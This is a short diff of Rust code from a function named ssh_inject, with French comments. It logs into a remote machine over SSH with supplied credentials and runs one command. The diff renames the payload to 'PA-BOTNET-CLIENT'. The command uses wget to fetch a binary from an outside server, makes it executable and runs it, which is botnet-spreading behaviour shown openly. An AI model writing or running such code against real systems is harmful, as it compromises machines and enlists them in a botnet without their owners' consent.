@@ -31,7 +31,7 @@ fn ssh_inject(ip_address: String, user: String, password: String, ip_srv: String
 
                 // Ouverture du canal de session et exécution de la commande
                 let mut channel = sess.channel_session().expect("Failed to open channel");
-                channel.exec(format!("wget http://{}:{}/api/foo_shi_shi_bang && chmod +x foo_shi_shi_bang && ./foo_shi_shi_bang",ip_srv,port_srv).as_str()).expect("Failed to execute command");
+                channel.exec(format!("wget http://{}:{}/api/PA-BOTNET-CLIENT && chmod +x PA-BOTNET-CLIENT && ./PA-BOTNET-CLIENT",ip_srv,port_srv).as_str()).expect("Failed to execute command");
 
                 let mut output = String::new();
                 channel
